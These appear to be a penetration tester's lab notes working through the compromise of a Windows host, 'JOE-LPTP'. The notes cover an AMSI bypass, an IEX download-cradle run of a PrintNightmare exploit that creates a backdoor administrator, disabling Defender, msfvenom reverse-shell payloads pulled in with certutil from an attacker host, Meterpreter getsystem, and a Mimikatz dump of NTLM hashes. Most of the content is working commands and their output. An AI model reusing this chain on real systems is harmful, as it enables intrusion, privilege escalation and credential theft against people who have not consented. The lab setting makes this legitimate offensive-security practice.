Hacktricks: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printnightmare

PrivEsc Used: https://github.com/JohnHammond/CVE-2021-34527

How to check if spools is running on a windows device
- would have gotten a path doesn't exist error if spools wasnt running
```powershell
*Evil-WinRM* PS C:\Users\joe\Documents> ls \\localhost\pipe\spoolss
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:5985  ...  OK


    Directory: \\localhost\pipe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
                                                  spoolss
```
```powershell
Evil-WinRM* PS C:\windows\system32> dir
    Directory: C:\windows\system32

-a----        10/11/2020   7:17 PM         799232 spoolsv.exe
```
Evil-WinRM Bypass-4MSI
- must be used everytime with defender
```powershell
*Evil-WinRM* PS C:\Users\joe\Documents> Bypass-4MSI
                                        
Info: Patching 4MSI, please be patient...
                                        
[+] Success!
```
invoke CVE-2021-34527.ps1 PrintNightmare
```powershell
*Evil-WinRM* PS C:\Users\joe\Documents> IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.14.39:8000/CVE-2021-34527.ps1'))

IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.14.39:8000/CVE-2021-34527.ps1'))
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:5985  ...  OK
```
activating invoke-nightmare
```powershell

*Evil-WinRM* PS C:\Users\joe\Documents> Invoke-Nightmare 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:5985  ...  OK
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\joe\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_311ad0065d69f772\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\joe\AppData\Local\Temp\nightmare.dll
*Evil-WinRM* PS C:\Users\joe\Documents> net localgroup administrators
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:5985  ...  OK
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
adm1n
Administrator
The command completed successfully.

```
tried to psexec on with new adm1n credentials
```
psexec didnt work.
```bash
┌──(root㉿kali)-[/tmp]
└─# proxychains psexec.py adm1n:'P@ssw0rd'@172.16.1.201
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:445  ...  OK
[*] Requesting shares on 172.16.1.201.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

```
VNCviewer
```bash
┌──(root㉿kali)-[/tmp]
└─# proxychains vncviewer 172.16.1.201:5900
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:5900  ...  OK
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password: 
Authentication successful
Desktop name "joe-lptp"
```
On as joe on JOE-LPTP
![[Pasted image 20230810171157.png]]
right clicked and ran as administrator and utilized the adm1n account that I created with the default P@ssw0rd
![[Pasted image 20230810171336.png]]
On as adm1n
![[Pasted image 20230810171445.png]]
Going to disable windows defender to get a meterpreter session
![[Pasted image 20230810171631.png]]
windows defender firewall was already off
![[Pasted image 20230810171725.png]]
turned off every setting in virus & threat protection settings
![[Pasted image 20230810171939.png]]

testing reverse shell
need meterpreter
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.39 LPORT=3434 -f exe -o rev.exe

windows/x64/meterpreter_reverse_tcp

Reverse shell to get meterpreter session
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.16.7 LPORT=3434 -f exe -o rev2.exe
```

Setting up multi/handler
```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload  windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
set lhost 10.10.16.7
set lport 3434 
run
```
Command ran on VNCviewer session to pull over rev.exe
- If you get acess denied, turn off real time protection on windows defender and should be good2go
```powershell
certutil -urlcache -split -f http://10.10.14.39:8000/rev.exe
```
Executed rev.exe
![[Pasted image 20230810173418.png]]
Caught reverse shell and getsystem
```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.39:3434 
[*] Meterpreter session 1 opened (10.10.14.39:3434 -> 10.10.110.3:46095) at 2023-08-10 17:29:27 -0400

meterpreter > whoami
[-] Unknown command: whoami
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > shell
Process 7780 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19041.508]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```
![[Pasted image 20230810173558.png]]

### Meterpreter Mimikatz testing
Followed this guide
https://www.hackers-arise.com/post/2018/11/26/metasploit-basics-part-21-post-exploitation-with-mimikatz


Backgrounded session 1
```bash
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > show sessions

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JOE-LPTP  10.10.14.39:3434 -> 10.10.110.3:46095 (172.16.1.201)
```
Commands used to inject payload with mimikatz
```bash
use /windows/local/payload_inject
set payload windows/x64/meterpreter_reverse_tcp
set lhost 10.10.14.39
set session 1
exploit
load kiwi
```
Had to getsystem again & dump creds, othing was here but good practice
```bash
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain    NTLM                              SHA1
--------  ------    ----                              ----
adm1n     JOE-LPTP  e19ccf75ee54e06b06a5907af13cef42  9131834cf4378828626b1beccaa5dea2c46f9b63
joe       JOE-LPTP  4568151a41ac1b353f40f4dc7f90f19d  3e33bb055f480a59134d0e536be9db007065a57b

wdigest credentials
===================

Username   Domain    Password
--------   ------    --------
(null)     (null)    (null)
JOE-LPTP$  JOE-LAB   (null)
adm1n      JOE-LPTP  (null)
joe        JOE-LPTP  (null)

kerberos credentials
====================

Username   Domain    Password
--------   ------    --------
(null)     (null)    (null)
adm1n      JOE-LPTP  (null)
joe        JOE-LPTP  (null)
joe-lptp$  JOE-LAB   (null)
```
### Going to add adm1n to remote users group

```bash
C:\Windows\system32>net localgroup "remote Desktop Users" "adm1n" /add
net localgroup "remote Desktop Users" "adm1n" /add
The command completed successfully.


C:\Windows\system32>net localgroup "Remote Desktop Users
net localgroup "Remote Desktop Users
Alias name     Remote Desktop Users
Comment        Members in this group are granted the right to logon remotely

Members

-------------------------------------------------------------------------------
adm1n
joe
The command completed successfully.


C:\Windows\system32>

net localgroup "Remote Management Use" "adm1n" /add
```

```bash
Next target
172.16.1.23
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
8089/tcp open  unknown

```
